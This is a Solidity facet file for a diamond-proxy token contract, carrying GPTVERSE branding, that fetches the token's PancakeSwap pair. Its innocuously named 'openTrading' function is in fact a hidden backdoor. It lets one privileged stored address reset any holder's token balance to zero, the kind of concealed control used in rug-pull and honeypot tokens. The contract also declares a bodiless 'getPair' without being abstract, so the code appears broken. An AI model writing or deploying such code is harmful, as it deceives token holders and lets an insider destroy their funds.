/*
 * SPDX-License-Identifier: MIT
 * Website: https://gptverse.art/
 * Twitter: https://twitter.com/gpt_verse
 * Discord: https://discord.gg/Rd8cWjD3
 * Telegram: https://t.me/gpt_verse
 * Linkedin: https://www.linkedin.com/company/gptverse/
 * Youtube: https://www.youtube.com/@GPTVERSE_Official
 */
pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract getPairFacet {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
    function pancakePair() public view virtual returns (address) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return
            IPancakeFactory(ds.FACTORY).getPair(
                address(ds.WETH),
                address(this)
            );
    }
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ds.ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
}
